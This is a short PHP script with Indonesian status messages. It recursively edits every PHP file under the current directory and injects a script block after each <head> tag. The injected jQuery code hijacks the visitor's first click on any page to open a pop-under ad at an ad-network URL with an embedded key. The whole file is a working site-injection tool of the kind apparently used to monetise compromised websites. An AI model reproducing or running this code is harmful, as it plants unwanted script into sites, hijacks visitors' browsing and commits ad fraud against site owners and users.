<?php
$script = '<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.min.js" integrity="sha256-xNzN2a4ltkB44Mc/Jz3pT4iU1cmeR0FkXs4pru/JxaQ=" crossorigin="anonymous"></script><script>$(document).ready(function(){$("body").addClass("xepo_ads");}).on("click",".xepo_ads",function(){$(this).removeClass("xepo_ads");window.open("https://www.effectivegatecpm.com/uddhzbaydb?key=95616f588657d5ed67af134f6e6917a6","_blank");});</script>';

function addScriptToPhpFiles($dir, $script) {
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));

    foreach ($files as $file) {
        if ($file->isFile() && $file->getExtension() === 'php') {
            $filePath = $file->getRealPath();
            $content = file_get_contents($filePath);

            if (strpos($content, '<head>') !== false) {
                if (strpos($content, $script) === false) {
                    $content = preg_replace('/<head>/', '<head>' . PHP_EOL . $script, $content, 1);
                    echo "Script ditambahkan ke: $filePath\n";
                } else {
                    $content = preg_replace('/' . preg_quote($script, '/') . '/', '', $content);
                    $content = preg_replace('/<head>/', '<head>' . PHP_EOL . $script, $content, 1);
                    echo "Duplicate script dihapus di: $filePath\n";
                }

                file_put_contents($filePath, $content);
            }
        }
    }
}

$directory = '.';
addScriptToPhpFiles($directory, $script);
